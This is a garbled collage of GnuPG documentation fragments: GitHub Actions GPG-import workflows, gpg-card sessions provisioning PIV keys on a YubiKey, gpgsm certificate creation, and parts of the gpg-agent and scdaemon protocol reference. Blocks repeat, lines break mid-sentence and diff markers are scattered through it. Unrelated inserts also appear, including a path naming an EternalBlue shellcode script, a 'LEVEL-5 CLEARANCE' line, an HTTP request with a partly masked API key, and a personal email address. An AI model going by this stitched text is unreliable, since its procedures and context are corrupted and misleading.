     passphrase: ${{ secrets.GPG_PASSPHRASE }}
 - uses: cli/gh-extension-precompile@v1
   with:
     gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }}
+# macOS +gpg --armor --export-secret-key joe@foo.bar | pbcopy + +# Ubuntu (assuming GNU base64) +gpg --armor --export-secret-key joe@foo.bar -w0 | xclip + +# Arch +gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i + +# FreeBSD (assuming BSD base64) +gpg --armor --export-secret-key joe@foo.bar | xclip + +name: import-gpg + +on:

push:
branches: master
+jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
 -
   name: List keys
   run: gpg -K
+name: import-gpg + +on:

push:
branches: master
+gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +jobs:

import-gpg:
runs-on: ubuntu-latest
steps:
 -
   name: Checkout
   uses: actions/checkout@v4
 -
   name: Import GPG key
   uses: crazy-max/ghaction-import-gpg@v6
   with:
     gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
     passphrase: ${{ secrets.PASSPHRASE }}
     fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8"
 -
   name: List keys
   run: gpg -K
+pub ed25519 2021-09-24 [C]

 87F257B89CE462100BEC0FFE6071D218380FDCC8
 Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092
+uid [ unknown] Joe Bar joe@bar.foo +sub ed25519 2021-09-24 [S]

 C17D11ADF199F12A30A0910F1F80449BE0B08CB8
 Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB
+name: import-gpg +/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add + +application-priority piv +to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens. + +With one of these methods employed the list command of gpg-card shows this: + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: [none]

 keyref .....: PIV.9A
+Card authenticat. : [none]

 keyref .....: PIV.9E
+Digital signature : [none]

 keyref .....: PIV.9C
+Key management ...: [none]

 keyref .....: PIV.9D
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key +list --cards +well. The PIV authentication key (internal reference PIV.9A +Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption + +gpg/card> auth 010203040506070801020304050607080102030405060708 +gpg/card> auth < myauth.key + +gpg/card> generate --algo=nistp384 PIV.9A +PIV card no. yk-9074625 detected +gpg/card> generate --algo=nistp256 PIV.9E +PIV card no. yk-9074625 detected +gpg/card> generate --algo=rsa2048 PIV.9C +PIV card no. yk-9074625 detected

‘--force’ +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E
 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpg +self-signed X.509 certificate (exit the gpg-card tool, first): + +$ gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D
+keygrip +gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +gpgsm --with-keygrip -k 6309304695z@gmail.com +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key + +$ gpgsm --learn +$ gpgsm --gen-key -o sign.crt +Please select what kind of key you want:

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 3 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 +Your selection? 3 +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 2 +Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> 6309304695z@gmail.com +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) +These parameters are used:
Key-Type: card:PIV.9C
Key-Length: 1024
Key-Usage: sign
Serial: random
Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
Name-Email: 6309304695z@gmail.com
+Proceed with creation? (y/N) y +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED +gpgsm: certificate created +Ready. +$ gpgsm --import sign.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +‘gpgsm --learn’ +Digital signature’ key +gpg-card:010203040506070801020304050607080102030405060708 + +shellcode/eternalblue_sc_merge.py + +gpg/card> writecert PIV.9C < sign.crt on: push: branches: master

AUTHENTICATE [--setkey] [--raw] [< file]|key] AUTH and set key

GENERATE [--force] [--algo=algo{+algo2}] keyref Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶ L

READCERT [--openpgp] certref > file ¶

openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3"

WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref Write a certificate to the card under the id certref.

WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key —Shadowed

YUBIKEY cmd args ¶ Various commands pertaining to Yubikey tokens with cmd being:

LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708.

PIV

Authentication key This is a 24 byte key described by the hex string 010203040506070801020304050607080102030405060708

the string gpg/card> is the prompt

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: D2760001240102010006090746250000 Application type .: OpenPGP Version ..........: 2.1 [...]

use help yubikey).

use help yubikey)

gpg/card> yubikey disable all opgp gpg/card> yubikey list Application USB NFC

OTP yes yes U2F yes yes OPGP no no PIV yes no OATH yes yes FIDO2 yes yes gpg/card> reset

/.gnupg/scdaemon.conf

application-priority piv

scdaemon

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: [none] keyref .....: PIV.9A Card authenticat. : [none] keyref .....: PIV.9E Digital signature : [none] keyref .....: PIV.9C Key management ...: [none] keyref .....: PIV.9D In

Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D)

Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key):

gpg/card> auth 010203040506070801020304050607080102030405060708

gpg/card> auth < myauth.key

gpg/card> generate --algo=nistp384 PIV.9A PIV card no. yk-9074625 detected gpg/card> generate --algo=nistp256 PIV.9E PIV card no. yk-9074625 detected gpg/card> generate --algo=rsa2048 PIV.9C PIV card no. yk-9074625 detected

gpg/card> list Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - 3 - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 Key management ...: [none] keyref .....: PIV.9D —force

$ gpgsm --gen-key -o encr.crt (1) RSA (2) Existing key (3) Existing key from card Your selection? 1 What keysize do you want? (3072) 2048 Requested keysize is 2048 bits Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 3 Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

[...] Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: otto@example.net

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

otto@example.net
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writecert PIV.9C < sign.crt

Reader ...........: 1050:0407:X:0 Card type ........: yubikey Card firmware ....: 5.1.2 Serial number ....: FF020001008A77C1 Application type .: PIV Version ..........: 1.0 Displayed s/n ....: yk-9074625 PIN usage policy .: app-pin PIN retry counter : - [verified] - PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E keyref .....: PIV.9A (auth) algorithm ..: nistp384 Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C keyref .....: PIV.9E (auth) algorithm ..: nistp256 Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED keyref .....: PIV.9C (sign,cert) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Signing key for yk-9074625,O=example,C=DE user id ..: otto@example.net Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: otto@example.net

PIV authentication’ key with ssh:

$ ssh-add -l 384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA)

$ gpgsm --learn $ gpg --full-gen-key Please select what kind of key you want: (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 3 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y

GnuPG needs to construct a user ID to identify your key.

Real name: Email address: otto@example.net Comment: You selected this USER-ID: "otto@example.net"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o gpg: key C3AFA9ED971BB365 marked as ultimately trusted gpg: revocation certificate stored as '[...]D971BB365.rev' public and secret key created and signed.

Note that this key cannot be used for encryption. You may want to use the command "--edit-key" to generate a subkey for this purpose. pub rsa2048 2019-04-04 [SC] 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 uid otto@example.net $ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 Secret key is available.

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate [ultimate] (1). otto@example.net gpg> addkey Secret parts of primary key are stored on-card. Please select what kind of key you want: (3) DSA (sign only) (4) RSA (sign only) (5) Elgamal (encrypt only) (6) RSA (encrypt only) (14) Existing key from card Your selection? 14 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth) (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth) (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign) (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) Your selection? 4 Please specify how long the key should be valid. 0 = key does not expire = key expires in n days w = key expires in n weeks m = key expires in n months y = key expires in n years Key is valid for? (0) Key does not expire at all Is this correct? (y/N) y Really create? (y/N) y

sec rsa2048/C3AFA9ED971BB365 created: 2019-04-04 expires: never usage: SC card-no: FF020001008A77C1 trust: ultimate validity: ultimate ssb rsa2048/7067860A98FCE6E1 created: 2019-04-04 expires: never usage: E card-no: FF020001008A77C1 [ultimate] (1). otto@example.net

gpg> save Now you can use your PIV card also with gpg.

 # 000006
/* 32A19-D90712
LEVEL-5 CLEARANCE ONLY ‘--force’ authentication key -header-'010203040506070801020304050607080102030405060708' SETDATA hexstring to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command

PKSIGN keyid where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:

PKSIGN --hash=algoname keyid READKEY hexified_certid READCERT hexified_certid|keyid SERIALNO Return the serial number of the card using a status response like:

S SERIALNO D27600000000000000000000 WRITEKEY [--force] keyid SETDATA hexstring to tell scdaemon about the data to be decrypted. The data must be given in hex notation. The actual decryption is then done using the command

PKDECRYPT keyid CHECKPIN idstr RESTART APDU [--atr] [--more] [--exlen[=n]] [hexstring] S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1

./configure --sysconfdir=/etc --localstatedir=/va CN=Wurzel ZS 3,O=Intevation GmbH,C=DE A6935DD34EF3087973C706FC311AA2CCF733765B S

CN=PCA-1-Verwaltung-02/O=PKI-1-Verwaltung/C=DE

DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S

CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE

!14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S

   # Key added on: 2011-07-20 20:38:46
   # Fingerprint:  5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81
   34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm
private-keys-v1.d/ gpg-connect-agent 'help COMMAND' /bye SETKEY Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available.

PKDECRYPT The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text.

S: INQUIRE CIPHERTEXT
C: D (xxxxxx
C: D xxxx)
C: END
Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure:

 (enc-val
   (<algo>
     (<param_name1> <mpi>)
   ...
     (<param_namen> <mpi>)))
Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency.

If the decryption was successful the decrypted data is returned by means of "D" lines.

Here is an example session:

C: PKDECRYPT S: INQUIRE CIPHERTEXT C: D (enc-val elg (a 349324324) C: D (b 3F444677CA))) C: END S: # session key follows S: S PADDING 0 S: D (value 1234567890ABCDEF0) S: OK decryption successful The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has SIGKEY This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay.

SETHASH --hash=| sig-val ( (<param_name1> ) ... (<param_namen> ))) The operation is affected by the option

OPTION use-cache-for-signing=0|1 The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching.

Here is an example session:

C: SIGKEY S: OK key available C: SIGKEY S: OK key available C: PKSIGN S: # I did ask the user whether he really wants to sign S: # I did ask the user for the passphrase S: INQUIRE HASHVAL C: D ABCDEF012345678901234 C: END S: # signature follows S: D (sig-val rsa (s 45435453654612121212)) S: OK GENKEY [--no-protection] [--preset] [<cache_nonce>] Invokes the key generation process and the server will then inquire on the generation parameters, like:

S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END The format of the key parameters which depends on the algorithm is of the form:

(genkey
  (algo
    (parameter_name_1 ....)
      ....
    (parameter_name_n ....)))
If everything succeeds, the server returns the public key in a SPKI like S-Expression like this:

 (public-key
   (rsa
 (n <mpi>)
 (e <mpi>)))
Here is an example session:

C: GENKEY S: INQUIRE KEYPARM C: D (genkey (rsa (nbits 1024))) C: END S: D (public-key S: D (rsa (n 326487324683264) (e 10001))) S OK key created ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> LISTTRUSTED GpgAgent returns a list of trusted keys line by line:

S: D 000000001234454556565656677878AF2F1ECCFF P
S: D 340387563485634856435645634856438576457A P
S: D FEDC6532453745367FD83474357495743757435D S
S: OK
The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. Ok Finally a client should be able to mark a key as trusted:

MARKTRUSTED fingerprint "P"|"S" The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:

S: INQUIRE TRUSTDESC C: D Do you trust the key with the fingerprint @FPR@ C: D bla fasel blurb. C: END S: OK GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
[--qualitybar] cache_id
[error_message prompt description] PRESET_PASSPHRASE [--inquire] <string_or_keygrip> []

HAVEKEY keygrips GET_CONFIRMATION description LEARN [--send] UPDATESTARTUPTTY SETDATA hexstring

PKSIGN keyid

PKSIGN --hash=algoname keyid

READCERT hexified_certid|keyid READKEY hexified_certid SETDATA hexstring d

PKSIGN keyid LEARN

PKSIGN --hash=algoname keyid

WRITEKEY [--force] keyid WRITEKEY [--force] keyid PASSWD [--reset] [--nullpin] chvno CHECKPIN idstr APDU [--atr] [--more] [--exlen[=n]] [hexstring] this:

 S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1
--auto-key-import

command --locate-external-key command --locate-external-key github/workflows/release.yml: ldap://keys.(thedomain) ‘--auto-key-locate --auto-key-locate --auto-key-retrieve

honor-keyserver-url

-sig-keyserver-url --recv-key honor-keyserver-url --use-agent --gpg-agent-info

--no-random-seed-file Host: c7-use-3.algolianet. com Accept: / Sec-Fetch-Site: cross-site Accept-Language: en-US, en; q=0.9 Accept-Encoding: gzip, deflate, br Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B Origin: https://dashboard.algolia.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe x-algolia-api-key: b3cf*************************米** Content-Length: 27 Connection: keep-alive Content-Type: application/x-www-form-urlencoded Sec-Fetch-Dest: empty

scdaemon.conf 1 HKCU\Software\GNU\GnuPG:DefaultLogFile, --debug-level level HKCU\Software\GNU\GnuPG:DefaultLogFile, scd-event HKCU\Software\GNU\GnuPG:HomeDir HKCU\Software\GNU\GnuPG:DefaultLogFile, reader_n.status HKCU\Software\GNU\GnuPG:HomeDir

trustlist.txt file gpg-agent.conf HKCU\Software\GNU\GnuPG:HomeDir name: release debug-pinentry --debug 1024

global trustlist (/usr/local/etc/gnupg/trustlist.tx

Active cards Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. gpg-connect-agent updatestartuptty /bye Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command:

gpg-connect-agent /bye --scdaemon-program filename Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf --check-passphrase-pattern file --check-sym-passphrase-pattern file Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe Keys listed in the sshcontrol file --disable-extended-key-format These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched.

--enable-ssh-support --enable-win32-openssh-support --enable-putty-support

gpg-connect-agent 'GETINFO s2k_count' /bye gpg-connect-agent 'GETINFO s2k_time' /bye To view the auto-calibrated count use:

gpg-connect-agent 'GETINFO s2k_count_cal' /bye --ssh-fingerprint-digest Keys listed in the sshcontrol file

Active card gpg-connect-agent /bye bashrc or whatever initialization file is used for all shell invocations:

GPG_TTY=$(tty) export GPG_TTY --daemon [command line] server

agent-program file ¶ Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs.

--gpg-program file Specify a non-default gpg binary to be used by certain commands.

--gpgsm-program file Specify a non-default gpgsm binary to be used by certain commands.

--chuid uid Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows.

gpg-card AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ AUTH FETCH GENERATE [--force] [--algo=algo{+algo2}] keyref KDF-SETUP ¶ Prepare the OpenPGP card KDF feature for this card.

LANG [--clear] Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info.

LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] NAME [--clear] PRIVATEDO [--clear] n [< file] file READCERT [--openpgp] certref > file ¶ Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". URL [--clear] gpg's. --fetch WRITECERT certref < file ¶ WRITECERT --openpgp certref [< file|fpr] WRITECERT --clear certref --openpgp file fpr. WRITEKEY [--force] keyref keygrip ¶ Write a private key object identified by keygrip to the card under the id keyref. CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ Serial number A hex-string with the serial number of the card.

Type This gives the type of the card’s application. For example "OpenPGP" or "PIV".

Keygrip A hex-string identifying a key.

Keyref The application slot where the key is stored on the card. For example "OpenPGP.1"

Status The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card.

YUBIKEY cmd args Various commands pertaining to Yubikey tokens with cmd being:

LIST List supported and enabled Yubikey applications.

ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] DISABLE Enable or disable the specified or all applications on the given interface.

